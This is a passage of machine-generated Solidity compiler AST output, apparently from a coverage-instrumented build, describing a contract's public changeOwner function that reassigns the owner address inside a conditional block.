                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "number",
                                    "lValueRequested": false,
                                    "nodeType": "Literal",
                                    "src": "1307:66:3",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_rational_70089049208405758999822418131581995419157113489037537261496961256628542100038_by_1",
                                      "typeString": "int_const 7008...(69 digits omitted)...0038"
                                    },
                                    "value": "0x9af4fefc324f1fdb166748644e640a9e04f1064999de7cea303fb012561dd246"
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_rational_70089049208405758999822418131581995419157113489037537261496961256628542100038_by_1",
                                      "typeString": "int_const 7008...(69 digits omitted)...0038"
                                    }
                                  ],
                                  "id": 320,
                                  "name": "c_0xac82e904",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 258,
                                  "src": "1294:12:3",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                                    "typeString": "function (bytes32) pure"
                                  }
                                },
                                "id": 322,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "1294:80:3",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_tuple$__$",
                                  "typeString": "tuple()"
                                }
                              },
                              "id": 323,
                              "nodeType": "ExpressionStatement",
                              "src": "1294:80:3"
                            }
                          ]
                        },
                        "id": 325,
                        "nodeType": "IfStatement",
                        "src": "928:463:3",
                        "trueBody": {
                          "id": 319,
                          "nodeType": "Block",
                          "src": "957:330:3",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "hexValue": "307832326637643261626534346436303533613332343364396439643266343432366161643039386462653163623237313931316564363530376662666161643630",
                                    "id": 304,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "number",
                                    "lValueRequested": false,
                                    "nodeType": "Literal",
                                    "src": "971:66:3",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_rational_15816502077758057489466246338246148221944645788546439756566019383675110206816_by_1",
                                      "typeString": "int_const 1581...(69 digits omitted)...6816"
                                    },
                                    "value": "0x22f7d2abe44d6053a3243d9d9d2f4426aad098dbe1cb271911ed6507fbfaad60"
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_rational_15816502077758057489466246338246148221944645788546439756566019383675110206816_by_1",
                                      "typeString": "int_const 1581...(69 digits omitted)...6816"
                                    }
                                  ],
                                  "id": 303,
                                  "name": "c_0xac82e904",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 258,
                                  "src": "958:12:3",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                                    "typeString": "function (bytes32) pure"
                                  }
                                },
                                "id": 305,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "958:80:3",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_tuple$__$",
                                  "typeString": "tuple()"
                                }
                              },
                              "id": 306,
                              "nodeType": "ExpressionStatement",
                              "src": "958:80:3"
                            },
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "hexValue": "307831396465363362373738326332383165313936643764356438663234363130396433383165643534626239393163343865323539666331613736333831343665",
                                    "id": 308,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "number",
                                    "lValueRequested": false,
                                    "nodeType": "Literal",
                                    "src": "1069:66:3",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_rational_11700749482176673401698337853246793570676396902372733874805285231623233082478_by_1",
                                      "typeString": "int_const 1170...(69 digits omitted)...2478"
                                    },
                                    "value": "0x19de63b7782c281e196d7d5d8f246109d381ed54bb991c48e259fc1a7638146e"
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_rational_11700749482176673401698337853246793570676396902372733874805285231623233082478_by_1",
                                      "typeString": "int_const 1170...(69 digits omitted)...2478"
                                    }
                                  ],
                                  "id": 307,
                                  "name": "c_0xac82e904",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 258,
                                  "src": "1056:12:3",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                                    "typeString": "function (bytes32) pure"
                                  }
                                },
                                "id": 309,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "1056:80:3",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_tuple$__$",
                                  "typeString": "tuple()"
                                }
                              },
                              "id": 310,
                              "nodeType": "ExpressionStatement",
                              "src": "1056:80:3"
                            },
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "hexValue": "307837366262623035656161386165626232356430616438313337353432353533366466643363626135323636393432363263383230616262636163663835363234",
                                    "id": 312,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "number",
                                    "lValueRequested": false,
                                    "nodeType": "Literal",
                                    "src": "1175:66:3",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_rational_53704533793491251789999261877610510645040883940458684344668521457195662464548_by_1",
                                      "typeString": "int_const 5370...(69 digits omitted)...4548"
                                    },
                                    "value": "0x76bbb05eaa8aebb25d0ad81375425536dfd3cba526694262c820abbcacf85624"
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_rational_53704533793491251789999261877610510645040883940458684344668521457195662464548_by_1",
                                      "typeString": "int_const 5370...(69 digits omitted)...4548"
                                    }
                                  ],
                                  "id": 311,
                                  "name": "c_0xac82e904",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 258,
                                  "src": "1162:12:3",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                                    "typeString": "function (bytes32) pure"
                                  }
                                },
                                "id": 313,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "1162:80:3",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_tuple$__$",
                                  "typeString": "tuple()"
                                }
                              },
                              "id": 314,
                              "nodeType": "ExpressionStatement",
                              "src": "1162:80:3"
                            },
                            {
                              "expression": {
                                "id": 317,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "lValueRequested": false,
                                "leftHandSide": {
                                  "id": 315,
                                  "name": "owner",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 260,
                                  "src": "1261:5:3",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_address",
                                    "typeString": "address"
                                  }
                                },
                                "nodeType": "Assignment",
                                "operator": "=",
                                "rightHandSide": {
                                  "id": 316,
                                  "name": "_owner",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 283,
                                  "src": "1269:6:3",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_address",
                                    "typeString": "address"
                                  }
                                },
                                "src": "1261:14:3",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_address",
                                  "typeString": "address"
                                }
                              },
                              "id": 318,
                              "nodeType": "ExpressionStatement",
                              "src": "1261:14:3"
                            }
                          ]
                        }
                      }
                    ]
                  },
                  "functionSelector": "a6f9dae1",
                  "id": 327,
                  "implemented": true,
                  "kind": "function",
                  "modifiers": [],
                  "name": "changeOwner",
                  "nameLocation": "591:11:3",
                  "nodeType": "FunctionDefinition",
                  "parameters": {
                    "id": 284,
                    "nodeType": "ParameterList",
                    "parameters": [
                      {
                        "constant": false,
                        "id": 283,
                        "mutability": "mutable",
                        "name": "_owner",
                        "nameLocation": "611:6:3",
                        "nodeType": "VariableDeclaration",
                        "scope": 327,
                        "src": "603:14:3",
                        "stateVariable": false,
                        "storageLocation": "default",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "typeName": {
                          "id": 282,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "603:7:3",
                          "stateMutability": "nonpayable",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "visibility": "internal"
                      }
                    ],
                    "src": "602:16:3"
                  },
                  "returnParameters": {
                    "id": 285,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "626:0:3"
                  },
                  "scope": 328,
                  "src": "582:816:3",
                  "stateMutability": "nonpayable",
                  "virtual": false,
                  "visibility": "public"
                }
              ],
              "scope": 329,
              "src": "114:1287:3",
              "usedErrors": []
            }
          ],
          "src": "33:1370:3"
        },
        "id": 3
      }
    }
  }
}
